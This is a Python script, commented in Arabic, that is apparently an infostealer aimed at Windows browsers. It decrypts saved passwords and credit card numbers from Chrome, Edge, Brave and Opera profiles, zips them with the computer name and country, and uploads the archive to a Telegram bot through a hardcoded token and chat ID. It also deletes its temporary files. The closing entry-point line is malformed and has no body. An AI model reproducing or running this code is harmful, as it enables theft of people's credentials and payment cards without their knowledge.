import os
import json
import base64
import sqlite3
import shutil
import socket
import platform
import requests
import tempfile
import zipfile
import getpass
import win32crypt
from Cryptodome.Cipher import AES

# بيانات البوت
BOT_TOKEN = '7739203669:AAEhu0Z3u5zIN-vJcMtwRSX1qKbuZZkrjo8'
CHAT_ID = '5929234804'

# الحصول على اسم الجهاز
def get_computer_name():
    return socket.gethostname()

# الحصول على الدولة عبر IP خارجي
def get_country():
    try:
        res = requests.get("http://ip-api.com/json", timeout=5)
        return res.json().get("country", "Unknown")
    except:
        return "Unknown"

# فك تشفير كلمات السر
def decrypt_data(encrypted, key):
    try:
        iv = encrypted[3:15]
        payload = encrypted[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
        except:
            return ""

# استخراج مفتاح التشفير
def get_master_key(browser_path):
    try:
        with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

# استخراج كلمات السر من متصفح
def extract_passwords(browser, path, passwords_list):
    key = get_master_key(path)
    if not key:
        return

    login_db = os.path.join(path, "Default", "Login Data")
    if not os.path.exists(login_db):
        return

    tmp_login = os.path.join(tempfile.gettempdir(), f"LoginData_{browser}.db")
    shutil.copy2(login_db, tmp_login)

    conn = sqlite3.connect(tmp_login)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, pwd in cursor.fetchall():
            decrypted = decrypt_data(pwd, key)
            passwords_list.append(f"🌐 {url}\n👤 {user}\n🔑 {decrypted}\n")
    except:
        pass
    finally:
        cursor.close()
        conn.close()
        os.remove(tmp_login)

# استخراج البطاقات البنكية
def extract_cards(browser, path, cards_list):
    key = get_master_key(path)
    if not key:
        return

    db_path = os.path.join(path, "Default", "Web Data")
    if not os.path.exists(db_path):
        return

    tmp_card = os.path.join(tempfile.gettempdir(), f"WebData_{browser}.db")
    shutil.copy2(db_path, tmp_card)

    conn = sqlite3.connect(tmp_card)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        for name, month, year, encrypted_card in cursor.fetchall():
            decrypted = decrypt_data(encrypted_card, key)
            cards_list.append(f"💳 الاسم: {name}\n💳 الرقم: {decrypted}\n📅 الصلاحية: {month}/{year}\n")
    except:
        pass
    finally:
        cursor.close()
        conn.close()
        os.remove(tmp_card)

# إرسال ملف إلى Telegram
def send_file_to_telegram(filepath, filename):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(filepath, 'rb') as f:
        requests.post(url, files={"document": (filename, f)}, data={"chat_id": CHAT_ID})

# المسارات المحتملة للمتصفحات
BROWSERS = {
    "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
    "Edge": os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
    "Brave": os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data"),
    "Opera": os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"),
}

def main():
    passwords = []
    cards = []

    for name, path in BROWSERS.items():
        extract_passwords(name, path, passwords)
        extract_cards(name, path, cards)

    if not passwords and not cards:
        return

    tmp_dir = tempfile.mkdtemp()
    pass_file = os.path.join(tmp_dir, "passwords.txt")
    card_file = os.path.join(tmp_dir, "cards.txt")

    if passwords:
        with open(pass_file, "w", encoding="utf-8") as f:
            f.writelines(passwords)

    if cards:
        with open(card_file, "w", encoding="utf-8") as f:
            f.writelines(cards)

    zip_name = f"{get_computer_name()}_{get_country()}.zip"
    zip_path = os.path.join(tempfile.gettempdir(), zip_name)

    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if os.path.exists(pass_file):
            zipf.write(pass_file, "passwords.txt")
        if os.path.exists(card_file):
            zipf.write(card_file, "cards.txt")

    send_file_to_telegram(zip_path, zip_name)

    shutil.rmtree(tmp_dir, ignore_errors=True)
    os.remove(zip_path)

if _name_ == "_main_":